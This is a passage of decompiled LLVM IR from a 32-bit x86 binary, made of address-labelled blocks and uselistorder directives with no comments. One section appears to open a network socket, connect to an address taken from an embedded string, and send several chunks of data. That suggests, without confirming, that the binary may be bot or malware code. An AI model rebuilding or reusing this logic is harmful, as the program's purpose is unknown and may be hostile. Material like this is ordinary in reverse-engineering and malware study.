dec_label_pc_804ee89:                             ; preds = %dec_label_pc_804ede6
  %v0_804ee8c = load i32, i32* @edi, align 4
  %v1_804ee8c = add i32 %v0_804ee8c, 4
  %v2_804ee8c = inttoptr i32 %v1_804ee8c to i32*
  %v3_804ee8c = load i32, i32* %v2_804ee8c, align 4
  store i32 %v3_804ee8c, i32* %eax.global-to-local, align 4
  %v2_804ee8f = add i32 %v0_804ee1c, 16
  %v3_804ee8f = inttoptr i32 %v2_804ee8f to i32*
  store i32 %v3_804ee8c, i32* %v3_804ee8f, align 4
  %v1_804ee90 = call i32 @function_804fce3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ee90, i32* %eax.global-to-local, align 4
  %v0_804ee98 = load i32, i32* @edi, align 4
  %v1_804ee98 = add i32 %v0_804ee98, 4
  %v2_804ee98 = inttoptr i32 %v1_804ee98 to i32*
  store i32 -1, i32* %v2_804ee98, align 4
  %v0_804ee9f = load i32, i32* @edi, align 4
  %v1_804ee9f = add i32 %v0_804ee9f, 284
  %v2_804ee9f = inttoptr i32 %v1_804ee9f to i8*
  store i8 0, i8* %v2_804ee9f, align 1
  %v0_804eea6 = load i32, i32* @edi, align 4
  %v1_804eea6 = add i32 %v0_804eea6, 12
  %v2_804eea6 = inttoptr i32 %v1_804eea6 to i32*
  store i32 0, i32* %v2_804eea6, align 4
  br label %dec_label_pc_804e3c2

dec_label_pc_804eeb2:                             ; preds = %dec_label_pc_804eb8d
  %v2_804eeb5 = inttoptr i32 %v0_804eba5 to i32*
  store i32 29, i32* %v2_804eeb5, align 4
  %v0_804eeb7 = call i32 @function_804f0e0()
  store i32 %v0_804eeb7, i32* %eax.global-to-local, align 4
  %v0_804eebc = load i32, i32* @esp, align 4
  %v1_804eebc = inttoptr i32 %v0_804eebc to i32*
  store i32 30, i32* %v1_804eebc, align 4
  %v0_804eec3 = call i32 @function_804f0e0()
  store i32 %v0_804eec3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e425.backedge

dec_label_pc_804e425.backedge:                    ; preds = %dec_label_pc_804e4a7, %dec_label_pc_804e9f8, %dec_label_pc_804ea99, %dec_label_pc_804e497, %dec_label_pc_804e836, %dec_label_pc_804e7f8, %dec_label_pc_804ed6d, %dec_label_pc_804e7b3, %dec_label_pc_804ec3d, %dec_label_pc_804e68e, %dec_label_pc_804e650, %dec_label_pc_804eaa6, %dec_label_pc_804e605, %dec_label_pc_804ecf4, %dec_label_pc_804e5c0, %dec_label_pc_804ea41, %dec_label_pc_804ebbb, %dec_label_pc_804e821, %dec_label_pc_804e642, %dec_label_pc_804e7f0, %dec_label_pc_804e679, %dec_label_pc_804e5fd, %dec_label_pc_804eeb2
  %v0_804e425 = load i32, i32* @edi, align 4
  %v1_804e425 = add i32 %v0_804e425, 12
  %v2_804e425 = inttoptr i32 %v1_804e425 to i32*
  %v3_804e425 = load i32, i32* %v2_804e425, align 4
  store i32 %v3_804e425, i32* %eax.global-to-local, align 4
  %v1_804e428 = icmp eq i32 %v3_804e425, 0
  br i1 %v1_804e428, label %dec_label_pc_804e3c2, label %dec_label_pc_804e425.backedge.dec_label_pc_804e42c_crit_edge

dec_label_pc_804e425.backedge.dec_label_pc_804e42c_crit_edge: ; preds = %dec_label_pc_804e425.backedge
  %v1_804e42f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e42c

dec_label_pc_804eed0:                             ; preds = %dec_label_pc_804ec9c
  %v1_804eed0 = add i32 %v0_804ecb3, 1
  %v8_804eed0 = icmp eq i32 %v1_804eed0, 0
  store i32 %v1_804eed0, i32* %eax.global-to-local, align 4
  br i1 %v8_804eed0, label %dec_label_pc_804ecc0, label %dec_label_pc_804eed7

dec_label_pc_804eed7:                             ; preds = %dec_label_pc_804eed0
  %v0_804eed7 = load i32, i32* @ecx, align 4
  %v1_804eed7 = load i32, i32* @esp, align 4
  %v2_804eed7 = add i32 %v1_804eed7, -4
  %v3_804eed7 = inttoptr i32 %v2_804eed7 to i32*
  store i32 %v0_804eed7, i32* %v3_804eed7, align 4
  %v1_804eed8 = add i32 %v1_804eed7, -8
  %v2_804eed8 = inttoptr i32 %v1_804eed8 to i32*
  store i32 0, i32* %v2_804eed8, align 4
  %v1_804eeda = add i32 %v1_804eed7, -12
  %v2_804eeda = inttoptr i32 %v1_804eeda to i32*
  store i32 1, i32* %v2_804eeda, align 4
  %v1_804eedc = add i32 %v1_804eed7, -16
  %v2_804eedc = inttoptr i32 %v1_804eedc to i32*
  store i32 2, i32* %v2_804eedc, align 4
  %v4_804eede = call i32 @function_80504f2(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804eede, i32* @eax, align 4
  %v0_804eee3 = load i32, i32* @esp, align 4
  %sext7 = mul i32 %v4_804eede, 16777216
  %v1_804eee6 = sdiv i32 %sext7, 16777216
  store i32 %v1_804eee6, i32* @ebx, align 4
  %tmp310 = icmp eq i32 %sext7, -16777216
  %v2_804e0a7 = inttoptr i32 %v0_804eee3 to i32*
  br i1 %tmp310, label %dec_label_pc_804e0a4, label %dec_label_pc_804eef1

dec_label_pc_804eef1:                             ; preds = %dec_label_pc_804eed7
  store i32 4, i32* %v2_804e0a7, align 4
  %v0_804eef6 = call i32 @function_804f160()
  store i32 %v0_804eef6, i32* %eax.global-to-local, align 4
  %v0_804eefb = load i32, i32* @esp, align 4
  %v1_804eefb = add i32 %v0_804eefb, 1828
  %v2_804eefb = inttoptr i32 %v1_804eefb to i16*
  store i16 2, i16* %v2_804eefb, align 2
  %v0_804ef05 = load i32, i32* @esp, align 4
  %v1_804ef05 = inttoptr i32 %v0_804ef05 to i32*
  store i32 ptrtoint ([15 x i8]* @global_var_80525e2.26 to i32), i32* %v1_804ef05, align 4
  %v0_804ef0c = call i32 @function_805029c()
  store i32 %v0_804ef0c, i32* %eax.global-to-local, align 4
  %v1_804ef11 = load i32, i32* @esp, align 4
  %v2_804ef11 = add i32 %v1_804ef11, 1832
  %v3_804ef11 = inttoptr i32 %v2_804ef11 to i32*
  store i32 %v0_804ef0c, i32* %v3_804ef11, align 4
  %v0_804ef18 = load i32, i32* @esp, align 4
  %v1_804ef18 = inttoptr i32 %v0_804ef18 to i32*
  %v2_804ef18 = load i32, i32* %v1_804ef18, align 4
  store i32 %v2_804ef18, i32* %eax.global-to-local, align 4
  %v3_804ef18 = add i32 %v0_804ef18, 4
  %v1_804ef19 = inttoptr i32 %v3_804ef18 to i32*
  %v2_804ef19 = load i32, i32* %v1_804ef19, align 4
  store i32 %v2_804ef19, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804ef19, align 4
  store i32 4, i32* %v1_804ef18, align 4
  %v0_804ef1e = call i32 @function_804f0b0()
  %v1_804ef1e = inttoptr i32 %v0_804ef1e to i16*
  store i32 %v0_804ef1e, i32* %eax.global-to-local, align 4
  %v3_804ef23 = load i16, i16* %v1_804ef1e, align 2
  %v4_804ef23 = zext i16 %v3_804ef23 to i32
  %v7_804ef23 = and i32 %v0_804ef1e, -65536
  %v8_804ef23 = or i32 %v4_804ef23, %v7_804ef23
  store i32 %v8_804ef23, i32* %eax.global-to-local, align 4
  %v0_804ef26 = load i32, i32* @esp, align 4
  %v1_804ef26 = inttoptr i32 %v0_804ef26 to i32*
  store i32 4, i32* %v1_804ef26, align 4
  %v0_804ef2d = load i32, i32* %eax.global-to-local, align 4
  %v1_804ef2d = trunc i32 %v0_804ef2d to i16
  %v2_804ef2d = load i32, i32* @esp, align 4
  %v3_804ef2d = add i32 %v2_804ef2d, 1830
  %v4_804ef2d = inttoptr i32 %v3_804ef2d to i16*
  store i16 %v1_804ef2d, i16* %v4_804ef2d, align 2
  %v0_804ef35 = call i32 @function_804f0e0()
  %v0_804ef3a = load i32, i32* @esp, align 4
  %v1_804ef3a = add i32 %v0_804ef3a, 1828
  store i32 %v1_804ef3a, i32* %eax.global-to-local, align 4
  %v1_804ef44 = add i32 %v0_804ef3a, 8
  %v2_804ef44 = inttoptr i32 %v1_804ef44 to i32*
  store i32 16, i32* %v2_804ef44, align 4
  %v0_804ef46 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ef46 = add i32 %v0_804ef3a, 4
  %v3_804ef46 = inttoptr i32 %v2_804ef46 to i32*
  store i32 %v0_804ef46, i32* %v3_804ef46, align 4
  %v0_804ef47 = load i32, i32* @ebx, align 4
  %v3_804ef47 = inttoptr i32 %v0_804ef3a to i32*
  store i32 %v0_804ef47, i32* %v3_804ef47, align 4
  %v3_804ef48 = call i32 @function_8050317(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804ef4d = load i32, i32* @esp, align 4
  %v1_804ef50 = add i32 %v3_804ef48, 1
  %v8_804ef50 = icmp eq i32 %v1_804ef50, 0
  store i32 %v1_804ef50, i32* %eax.global-to-local, align 4
  %v1_804ef51 = icmp eq i1 %v8_804ef50, false
  br i1 %v1_804ef51, label %dec_label_pc_804f00c, label %dec_label_pc_804ef5a

dec_label_pc_804ef5a:                             ; preds = %dec_label_pc_804eef1, %dec_label_pc_804f00c
  %storemerge4.in = phi i32 [ %v0_804f0a8, %dec_label_pc_804f00c ], [ %v0_804ef4d, %dec_label_pc_804eef1 ]
  %v0_804ef5a = load i32, i32* @ebx, align 4
  %v3_804ef5a = inttoptr i32 %storemerge4.in to i32*
  store i32 %v0_804ef5a, i32* %v3_804ef5a, align 4
  %v1_804ef5b = call i32 @function_804fce3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ef5b, i32* @eax, align 4
  %v0_804ef60 = load i32, i32* @esp, align 4
  %v1_804ef60 = inttoptr i32 %v0_804ef60 to i32*
  store i32 0, i32* %v1_804ef60, align 4
  %v1_804ef67 = call i32 @function_805182e(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ef67, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef6c

dec_label_pc_804ef6c:                             ; preds = %dec_label_pc_804e2f5, %dec_label_pc_804e2d5, %dec_label_pc_804ef5a
  %v0_804ef6c = load i32, i32* @ebx, align 4
  %v1_804ef6c = add i32 %v0_804ef6c, 284
  %v2_804ef6c = inttoptr i32 %v1_804ef6c to i8*
  store i8 0, i8* %v2_804ef6c, align 1
  %v0_804ef73 = load i32, i32* @ebx, align 4
  %v1_804ef73 = add i32 %v0_804ef73, 12
  %v2_804ef73 = inttoptr i32 %v1_804ef73 to i32*
  store i32 0, i32* %v2_804ef73, align 4
  br label %dec_label_pc_804e293

dec_label_pc_804ef7f:                             ; preds = %dec_label_pc_804e8c3
  %v1_804ef7f = add i32 %v0_804e46a, 40
  %v2_804ef7f = inttoptr i32 %v1_804ef7f to i32*
  %v3_804ef7f = load i32, i32* %v2_804ef7f, align 4
  store i32 %v3_804ef7f, i32* %eax.global-to-local, align 4
  %v1_804ef83 = inttoptr i32 %v3_804ef7f to i32*
  store i32 104, i32* %v1_804ef83, align 4
  %v0_804e8df.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e8df

dec_label_pc_804ef8e:                             ; preds = %dec_label_pc_804e8df
  store i32 %v0_804ef8e, i32* @eax, align 4
  %v0_804ef90 = call i32 @function_804d8f0()
  store i32 %v0_804ef90, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e3c2

dec_label_pc_804ef9a:                             ; preds = %dec_label_pc_804e9a6
  %v11_804ef9a = icmp eq i8 %v2_804e9a6, -5
  %v1_804ef9c = icmp eq i1 %v11_804ef9a, false
  br i1 %v1_804ef9c, label %dec_label_pc_804e4e0, label %dec_label_pc_804efa2

dec_label_pc_804efa2:                             ; preds = %dec_label_pc_804ef9a
  store i8 -3, i8* %v1_804e9a6, align 1
  br label %dec_label_pc_804e4e0

dec_label_pc_804efaa:                             ; preds = %dec_label_pc_804e99c
  %v1_804efaa = add i32 %v0_804e988, -4
  %v2_804efaa = inttoptr i32 %v1_804efaa to i32*
  store i32 16384, i32* %v2_804efaa, align 4
  %v1_804efaf = add i32 %v0_804e988, -8
  %v2_804efaf = inttoptr i32 %v1_804efaf to i32*
  store i32 3, i32* %v2_804efaf, align 4
  %v1_804efb1 = add i32 %v0_804e988, 1863
  store i32 %v1_804efb1, i32* %eax.global-to-local, align 4
  %v0_804efb8 = load i32, i32* @ebx, align 4
  %v1_804efb8 = add i32 %v0_804efb8, 3
  store i32 %v1_804efb8, i32* @ebx, align 4
  %v2_804efbb = add i32 %v0_804e988, -12
  %v3_804efbb = inttoptr i32 %v2_804efbb to i32*
  store i32 %v1_804efb1, i32* %v3_804efbb, align 4
  %v0_804efbc = load i32, i32* @esi, align 4
  %v1_804efbc = add i32 %v0_804efbc, 3
  store i32 %v1_804efbc, i32* @esi, align 4
  %v0_804efbf = load i32, i32* @edi, align 4
  %v1_804efbf = add i32 %v0_804efbf, 4
  %v2_804efbf = inttoptr i32 %v1_804efbf to i32*
  %v3_804efbf = load i32, i32* %v2_804efbf, align 4
  store i32 %v3_804efbf, i32* %eax.global-to-local, align 4
  %v2_804efc2 = add i32 %v0_804e988, -16
  %v3_804efc2 = inttoptr i32 %v2_804efc2 to i32*
  store i32 %v3_804efbf, i32* %v3_804efc2, align 4
  %v0_804efc3 = call i32 @function_8050441()
  %v0_804efc8 = load i32, i32* @esp, align 4
  %v1_804efc8 = add i32 %v0_804efc8, -4
  %v2_804efc8 = inttoptr i32 %v1_804efc8 to i32*
  store i32 16384, i32* %v2_804efc8, align 4
  %v1_804efcd = add i32 %v0_804efc8, -8
  %v2_804efcd = inttoptr i32 %v1_804efcd to i32*
  store i32 9, i32* %v2_804efcd, align 4
  %v1_804efcf = add i32 %v0_804efc8, 1847
  store i32 %v1_804efcf, i32* %eax.global-to-local, align 4
  %v2_804efd6 = add i32 %v0_804efc8, -12
  %v3_804efd6 = inttoptr i32 %v2_804efd6 to i32*
  store i32 %v1_804efcf, i32* %v3_804efd6, align 4
  %v0_804efd7 = load i32, i32* @edi, align 4
  %v1_804efd7 = add i32 %v0_804efd7, 4
  %v2_804efd7 = inttoptr i32 %v1_804efd7 to i32*
  %v3_804efd7 = load i32, i32* %v2_804efd7, align 4
  store i32 %v3_804efd7, i32* %eax.global-to-local, align 4
  %v2_804efda = add i32 %v0_804efc8, -16
  %v3_804efda = inttoptr i32 %v2_804efda to i32*
  store i32 %v3_804efd7, i32* %v3_804efda, align 4
  %v0_804efdb = call i32 @function_8050441()
  store i32 %v0_804efdb, i32* %eax.global-to-local, align 4
  %v0_804efe0 = load i32, i32* @esp, align 4
  %v1_804efe0 = add i32 %v0_804efe0, 32
  %v0_804efe3 = load i32, i32* @edi, align 4
  %v1_804efe3 = add i32 %v0_804efe3, 24
  %v2_804efe3 = inttoptr i32 %v1_804efe3 to i32*
  %v3_804efe3 = load i32, i32* %v2_804efe3, align 4
  store i32 %v3_804efe3, i32* %edx.global-to-local, align 4
  %v0_804e4b0.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e4b0.backedge

dec_label_pc_804effd:                             ; preds = %dec_label_pc_804e744
  store i32 %v0_804effd, i32* @eax, align 4
  store i32 -1, i32* @esi, align 4
  %v0_804f002 = call i32 @function_804d8f0()
  store i32 %v0_804f002, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e788

dec_label_pc_804f00c:                             ; preds = %dec_label_pc_804eef1
  %v1_804f00c = add i32 %v0_804ef4d, 1864
  %v2_804f00c = inttoptr i32 %v1_804f00c to i8*
  store i8 0, i8* %v2_804f00c, align 1
  %v0_804f014 = load i32, i32* @esp, align 4
  %v1_804f014 = add i32 %v0_804f014, -4
  %v2_804f014 = inttoptr i32 %v1_804f014 to i32*
  store i32 16384, i32* %v2_804f014, align 4
  %v1_804f019 = add i32 %v0_804f014, -8
  %v2_804f019 = inttoptr i32 %v1_804f019 to i32*
  store i32 1, i32* %v2_804f019, align 4
  %v1_804f01b = add i32 %v0_804f014, 1848
  store i32 %v1_804f01b, i32* %edx.global-to-local, align 4
  %v2_804f022 = add i32 %v0_804f014, -12
  %v3_804f022 = inttoptr i32 %v2_804f022 to i32*
  store i32 %v1_804f01b, i32* %v3_804f022, align 4
  %v0_804f023 = load i32, i32* @ebx, align 4
  %v2_804f023 = add i32 %v0_804f014, -16
  %v3_804f023 = inttoptr i32 %v2_804f023 to i32*
  store i32 %v0_804f023, i32* %v3_804f023, align 4
  %v0_804f024 = call i32 @function_8050441()
  %v0_804f029 = load i32, i32* @esp, align 4
  %v1_804f029 = add i32 %v0_804f029, -4
  %v2_804f029 = inttoptr i32 %v1_804f029 to i32*
  store i32 16384, i32* %v2_804f029, align 4
  %v1_804f02e = add i32 %v0_804f029, -8
  %v2_804f02e = inttoptr i32 %v1_804f02e to i32*
  store i32 4, i32* %v2_804f02e, align 4
  %v1_804f030 = add i32 %v0_804f029, 1872
  store i32 %v1_804f030, i32* %eax.global-to-local, align 4
  %v2_804f037 = add i32 %v0_804f029, -12
  %v3_804f037 = inttoptr i32 %v2_804f037 to i32*
  store i32 %v1_804f030, i32* %v3_804f037, align 4
  %v0_804f038 = load i32, i32* @ebx, align 4
  %v2_804f038 = add i32 %v0_804f029, -16
  %v3_804f038 = inttoptr i32 %v2_804f038 to i32*
  store i32 %v0_804f038, i32* %v3_804f038, align 4
  %v0_804f039 = call i32 @function_8050441()
  %v0_804f03e = load i32, i32* @esp, align 4
  %v1_804f041 = add i32 %v0_804f03e, 28
  %v2_804f041 = inttoptr i32 %v1_804f041 to i32*
  store i32 16384, i32* %v2_804f041, align 4
  %v1_804f046 = add i32 %v0_804f03e, 24
  %v2_804f046 = inttoptr i32 %v1_804f046 to i32*
  store i32 2, i32* %v2_804f046, align 4
  %v1_804f048 = add i32 %v0_804f03e, 1898
  store i32 %v1_804f048, i32* %eax.global-to-local, align 4
  %v2_804f04f = add i32 %v0_804f03e, 20
  %v3_804f04f = inttoptr i32 %v2_804f04f to i32*
  store i32 %v1_804f048, i32* %v3_804f04f, align 4
  %v0_804f050 = load i32, i32* @ebx, align 4
  %v2_804f050 = add i32 %v0_804f03e, 16
  %v3_804f050 = inttoptr i32 %v2_804f050 to i32*
  store i32 %v0_804f050, i32* %v3_804f050, align 4
  %v0_804f051 = call i32 @function_8050441()
  %v0_804f056 = load i32, i32* @ebp, align 4
  %v1_804f056 = add i32 %v0_804f056, 12
  store i32 %v1_804f056, i32* %eax.global-to-local, align 4
  %v0_804f059 = load i32, i32* @esp, align 4
  %v1_804f059 = add i32 %v0_804f059, -4
  %v2_804f059 = inttoptr i32 %v1_804f059 to i32*
  store i32 16384, i32* %v2_804f059, align 4
  %v1_804f05e = add i32 %v0_804f059, -8
  %v2_804f05e = inttoptr i32 %v1_804f05e to i32*
  store i32 1, i32* %v2_804f05e, align 4
  %v0_804f060 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f060 = add i32 %v0_804f059, -12
  %v3_804f060 = inttoptr i32 %v2_804f060 to i32*
  store i32 %v0_804f060, i32* %v3_804f060, align 4
  %v0_804f061 = load i32, i32* @ebx, align 4
  %v2_804f061 = add i32 %v0_804f059, -16
  %v3_804f061 = inttoptr i32 %v2_804f061 to i32*
  store i32 %v0_804f061, i32* %v3_804f061, align 4
  %v0_804f062 = call i32 @function_8050441()
  %v0_804f067 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f06c = add i32 %v0_804f067, 28
  %v2_804f06c = inttoptr i32 %v1_804f06c to i32*
  store i32 16384, i32* %v2_804f06c, align 4
  %v0_804f071 = load i32, i32* @ebp, align 4
  %v1_804f071 = add i32 %v0_804f071, 12
  %v2_804f071 = inttoptr i32 %v1_804f071 to i8*
  %v3_804f071 = load i8, i8* %v2_804f071, align 1
  %v4_804f071 = zext i8 %v3_804f071 to i32
  %v5_804f071 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f071 = and i32 %v5_804f071, -256
  %v7_804f071 = or i32 %v6_804f071, %v4_804f071
  store i32 %v7_804f071, i32* %eax.global-to-local, align 4
  %v2_804f074 = add i32 %v0_804f067, 24
  %v3_804f074 = inttoptr i32 %v2_804f074 to i32*
  store i32 %v7_804f071, i32* %v3_804f074, align 4
  %v0_804f075 = load i32, i32* @ebp, align 4
  %v1_804f075 = inttoptr i32 %v0_804f075 to i32*
  %v2_804f075 = load i32, i32* %v1_804f075, align 4
  store i32 %v2_804f075, i32* %eax.global-to-local, align 4
  %v2_804f078 = add i32 %v0_804f067, 20
  %v3_804f078 = inttoptr i32 %v2_804f078 to i32*
  store i32 %v2_804f075, i32* %v3_804f078, align 4
  %v0_804f079 = load i32, i32* @ebx, align 4
  %v2_804f079 = add i32 %v0_804f067, 16
  %v3_804f079 = inttoptr i32 %v2_804f079 to i32*
  store i32 %v0_804f079, i32* %v3_804f079, align 4
  %v0_804f07a = call i32 @function_8050441()
  %v0_804f07f = load i32, i32* @ebp, align 4
  %v1_804f07f = add i32 %v0_804f07f, 13
  store i32 %v1_804f07f, i32* %eax.global-to-local, align 4
  %v0_804f082 = load i32, i32* @esp, align 4
  %v1_804f082 = add i32 %v0_804f082, -4
  %v2_804f082 = inttoptr i32 %v1_804f082 to i32*
  store i32 16384, i32* %v2_804f082, align 4
  %v1_804f087 = add i32 %v0_804f082, -8
  %v2_804f087 = inttoptr i32 %v1_804f087 to i32*
  store i32 1, i32* %v2_804f087, align 4
  %v0_804f089 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f089 = add i32 %v0_804f082, -12
  %v3_804f089 = inttoptr i32 %v2_804f089 to i32*
  store i32 %v0_804f089, i32* %v3_804f089, align 4
  %v0_804f08a = load i32, i32* @ebx, align 4
  %v2_804f08a = add i32 %v0_804f082, -16
  %v3_804f08a = inttoptr i32 %v2_804f08a to i32*
  store i32 %v0_804f08a, i32* %v3_804f08a, align 4
  %v0_804f08b = call i32 @function_8050441()
  %v0_804f090 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f095 = add i32 %v0_804f090, 28
  %v2_804f095 = inttoptr i32 %v1_804f095 to i32*
  store i32 16384, i32* %v2_804f095, align 4
  %v0_804f09a = load i32, i32* @ebp, align 4
  %v1_804f09a = add i32 %v0_804f09a, 13
  %v2_804f09a = inttoptr i32 %v1_804f09a to i8*
  %v3_804f09a = load i8, i8* %v2_804f09a, align 1
  %v4_804f09a = zext i8 %v3_804f09a to i32
  %v5_804f09a = load i32, i32* %eax.global-to-local, align 4
  %v6_804f09a = and i32 %v5_804f09a, -256
  %v7_804f09a = or i32 %v6_804f09a, %v4_804f09a
  store i32 %v7_804f09a, i32* %eax.global-to-local, align 4
  %v2_804f09d = add i32 %v0_804f090, 24
  %v3_804f09d = inttoptr i32 %v2_804f09d to i32*
  store i32 %v7_804f09a, i32* %v3_804f09d, align 4
  %v0_804f09e = load i32, i32* @ebp, align 4
  %v1_804f09e = add i32 %v0_804f09e, 4
  %v2_804f09e = inttoptr i32 %v1_804f09e to i32*
  %v3_804f09e = load i32, i32* %v2_804f09e, align 4
  store i32 %v3_804f09e, i32* %eax.global-to-local, align 4
  %v2_804f0a1 = add i32 %v0_804f090, 20
  %v3_804f0a1 = inttoptr i32 %v2_804f0a1 to i32*
  store i32 %v3_804f09e, i32* %v3_804f0a1, align 4
  %v0_804f0a2 = load i32, i32* @ebx, align 4
  %v2_804f0a2 = add i32 %v0_804f090, 16
  %v3_804f0a2 = inttoptr i32 %v2_804f0a2 to i32*
  store i32 %v0_804f0a2, i32* %v3_804f0a2, align 4
  %v0_804f0a3 = call i32 @function_8050441()
  store i32 %v0_804f0a3, i32* %eax.global-to-local, align 4
  %v0_804f0a8 = load i32, i32* @esp, align 4
  %v1_804f0a8 = inttoptr i32 %v0_804f0a8 to i32*
  %v2_804f0a8 = load i32, i32* %v1_804f0a8, align 4
  store i32 %v2_804f0a8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef5a

; uselistorder directives
  uselistorder i32 %v0_804f0a8, { 1, 0 }
  uselistorder i32 %v3_804efe3, { 1, 0 }
  uselistorder i32 %v0_804efe3, { 1, 0 }
  uselistorder i32 %v0_804efdb, { 1, 0 }
  uselistorder i32 %v0_804ef4d, { 1, 0 }
  uselistorder i32 %v0_804ef1e, { 0, 2, 1 }
  uselistorder i32* %v2_804e0a7, { 1, 0 }
  uselistorder i32 %v0_804e425, { 1, 0 }
  uselistorder i32 %v0_804ee61, { 0, 2, 3, 1 }
  uselistorder i32 %v1_804ee60, { 1, 0, 2 }
  uselistorder i16 %v1_804ee68, { 1, 0 }
  uselistorder i64 %v8_804ee4b, { 1, 0 }
  uselistorder i32 %v1_804ed6d, { 1, 2, 0 }
  uselistorder i32 %v1_804ecf4, { 1, 2, 0 }
  uselistorder i32 %v0_804ecb3, { 1, 0, 2 }
  uselistorder i32 %v0_804ec8b, { 2, 1, 0 }
  uselistorder i32 %v0_804ec64, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_804ebe9.in, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804ebdd, { 1, 0 }
  uselistorder i32 %v0_804ebd4, { 1, 0 }
  uselistorder i32 %v0_804eb63, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804eaa6, { 1, 2, 0 }
  uselistorder i32 %v0_804ea5f.in, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804ea4e, { 1, 0 }
  uselistorder i32 %v0_804ea13, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_804e992, { 1, 0, 2 }
  uselistorder i32 %v1_804e98f, { 1, 0, 2 }
  uselistorder i32 %v0_804e98c, { 1, 0 }
  uselistorder i32 %v0_804e988, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v0_804ef8e, { 1, 0 }
  uselistorder i32 %v2_804e4b0, { 1, 0 }
  uselistorder i32 %v0_804e4b0, { 1, 2, 4, 3, 0 }
  uselistorder i32 %v1_804e4b0, { 0, 2, 1 }
  uselistorder i32 %v0_804e52e120, { 1, 0 }
  uselistorder i32 %v9_804e828, { 1, 0 }
  uselistorder i32 %v1_804e821, { 1, 3, 2, 0 }
  uselistorder i32 %v0_804e821, { 1, 0, 2 }
  uselistorder i32 %v3_804e7f8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804e7f0, { 2, 1, 0 }
  uselistorder i32 %v9_804e7bf, { 1, 0 }
  uselistorder i32 %v0_804ed6d, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804e78d, { 1, 2, 0 }
  uselistorder i32 %v1_804e78d, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804e788, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_804effd, { 1, 0 }
  uselistorder i32* %v1_804ec47, { 2, 0, 1 }
  uselistorder i32 %v0_804e722, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v9_804e680, { 1, 0 }
  uselistorder i32 %v1_804e679, { 1, 3, 2, 0 }
  uselistorder i32 %v0_804e679, { 1, 0, 2 }
  uselistorder i32 %v3_804e650, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804e642, { 2, 1, 0 }
  uselistorder i32 %v9_804e611, { 1, 0 }
  uselistorder i32 %v0_804eaa6, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e5fd, { 2, 1, 0 }
  uselistorder i32 %v9_804e5cc, { 1, 0 }
  uselistorder i32 %v0_804ecf4, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e5b4, { 2, 1, 0 }
  uselistorder i32 %v9_804e58c, { 1, 0 }
  uselistorder i32 %v0_804e9ec, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e577, { 2, 1, 0 }
  uselistorder i32 %v9_804e546, { 1, 0 }
  uselistorder i32 %v0_804eb1b, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804e522, { 1, 0 }
  uselistorder i32 %v0_804e522, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_804e51c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804e51c, { 0, 2, 1 }
  uselistorder i32 %v0_804e517, { 1, 0 }
  uselistorder i8* %v2_804e4f2, { 1, 0, 2 }
  uselistorder i8* %v1_804e4e0, { 1, 0, 2 }
  uselistorder i32 %v1_804e4bd, { 1, 0, 2 }
  uselistorder i32 %v0_804e928, { 1, 0, 2 }
  uselistorder i32 %v0_804e8b2, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804e52e121, { 3, 0, 1, 2 }
  uselistorder i32 %v2_804e4b017, { 1, 0 }
  uselistorder i32 %v3_804e497, { 1, 0 }
  uselistorder i32 %v0_804e497, { 1, 15, 2, 13, 3, 12, 4, 14, 5, 11, 6, 10, 7, 9, 0, 8, 16 }
  uselistorder i32 %v1_804e482, { 0, 2, 1 }
  uselistorder i32 %v0_804e47e, { 1, 0 }
  uselistorder i32 %v0_804e465, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 %v1_804e45b, { 1, 0 }
  uselistorder i32 %v1_804e413, { 1, 0 }
  uselistorder i32 %v2_804e410, { 1, 0 }
  uselistorder i32 %v0_804e40e, { 1, 0 }
  uselistorder i32 %v0_804e3fb, { 2, 1, 0 }
  uselistorder i32 %v1_804e3f8, { 1, 0 }
  uselistorder i32 %v2_804e3f5, { 1, 0 }
  uselistorder i32 %v3_804e3e9, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_804e3d1, { 1, 0 }
  uselistorder i32 %v0_804e3d1, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e378, { 1, 0 }
  uselistorder i32 %v2_804e335, { 1, 0 }
  uselistorder i32 %v3_804e332, { 1, 0, 2, 3 }
  uselistorder i1 %v9_804e2c2, { 1, 0 }
